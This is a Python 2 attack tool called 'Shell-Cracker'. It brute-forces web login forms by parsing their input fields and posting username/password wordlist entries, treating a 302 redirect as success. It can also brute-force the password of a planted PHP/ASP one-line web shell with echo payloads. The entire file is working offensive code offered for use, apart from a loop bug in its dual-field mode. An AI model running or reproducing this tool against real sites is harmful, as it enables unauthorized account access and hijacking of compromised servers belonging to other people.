#!/usr/bin/env python
#coding=utf-8
import HTMLParser
import urllib
import time
import re
import httplib
import urllib2
from urlparse import urlparse
type_tmp=[]
name_tmp=[]
value_tmp=[]
tmp=[]
a=0
b=0
#c=0
#count = 0
global user,pwd,url,filename,filetype,site,hid_master,hid_follow,count

user = "demon-user"
pwd = "demon-pwd" 
hid_master ="hidden_name"
hid_follow = "hidden_value"
class Parselinks(HTMLParser.HTMLParser):
	def handle_starttag(self,tag,attrs):
		if tag == 'input':
			for name,value in attrs:
				if name == 'type':
					type_tmp.append(value)
			for name,value in attrs:
				if name == 'name':
					name_tmp.append(value)
		global values
		if tag == 'input':
			value = "None"
			for name,val in attrs:
				if name == 'value':
					value = val
					break
			value_tmp.append(value)

def tag_count():
	tag = '<input'
	res = urllib2.urlopen(url)
	html = res.read()
	taglist = re.findall(re.compile(tag),html)
	return len(taglist)

def post(username,password,u,p,hid_master,hid_follow):
	p = p.strip()
	params = urllib.urlencode({username:u,password:p,hid_master:hid_follow})
	headers = {"Content-type":"application/x-www-form-urlencoded"}
	conn = httplib.HTTPConnection(site,"80")
	conn.request("POST",filename,params,headers)
	response = conn.getresponse()
	if response.status == 302:
		print "[!]May the Demon bless you!\n[!]user=>"+u+"\n"+"[!]pwd=>"+p+"\n"
		exit(0)
	conn.close()

def oneword(output,p):
	p = p.strip()
	params = urllib.urlencode({p:output})
	headers = {"Content-type":"application/x-www-form-urlencoded"}
	conn = httplib.HTTPConnection(site,"80")
	conn.request("POST",filename,params,headers)
	result = conn.getresponse().read()
	pattern = re.compile('Demon')
	match = pattern.search(result)
	if match:
		print "[!]May the Demon bless you!\n[!]pwd=>"+p
		exit(0)
	else:
		conn.close()
	conn.close()

def choice1(user,pwd,hid_master,hid_follow):
	username = user
	password = pwd
	udic = open("username.txt","r")
	pdic = open("password.txt","r")
	for u in udic.readlines():
		for p in pdic.readlines():
			post(username,password,u,p,hid_master,hid_follow)


def choice2(pwd,hid_master,hid_follow):
	password = pwd
	pdic = open("password.txt","r")
	for p in pdic.readlines():
		post('Demon',password,'demon',p,hid_master,hid_follow)

def choice3(filetype):
	pdic = open("password.txt","r")  
#p-dic=xxx  类似的被视为operator
	for p in pdic.readlines():
		if filetype == "asp" or filetype == "aspx":
			output = "Response.Write('Demon sword.');"
		elif filetype == "php":
			output = "echo 'Demon sword';"
		oneword(output,p)

def Urlparse(url):
	urlparsed = urlparse(url)
	site = urlparsed[1]
	filename = urlparsed[2]
	return (site,filename)


if __name__ == "__main__":
	print """
	+===============================+
	+	Shell-Cracker		+
	+	version 1.0		+
	+	demon@dawner.info	+
	+===============================+
	\nPlease Enter your choice:\n1.Double input box.\n2.Password only.\n3.One word shell.\n\n<-|->"""


cmd = raw_input()
print "Please input your total url:\n<-|->"

url = raw_input()
tagcount = tag_count()

tmp = Urlparse(url)
site = tmp[0]
filename = tmp[1]

parsed = Parselinks()
parsed.feed(urllib.urlopen(url).read())

for x in type_tmp:
	if x == "text":
		user = name_tmp[a]
	elif x == "password":
		pwd = name_tmp[a]
	elif x == "hidden":
		hid_master = name_tmp[a]
		hid_follow = value_tmp[a]
	a=a+1

print "[+]username:"+user+"\n"+"[+]password:"+pwd+"\nStart cracking....."

if cmd == "1":
	time.sleep(5) 
	choice1(user,pwd,hid_master,hid_follow)
elif cmd == "2":
	time.sleep(5) 
	choice2(pwd,hid_master,hid_follow)
elif cmd == "3":
	print "Input your filetype:\n<-|->"
	filetype = raw_input()
	time.sleep(5) 
	choice3(filetype)
else:
	print "Good bye,sir."




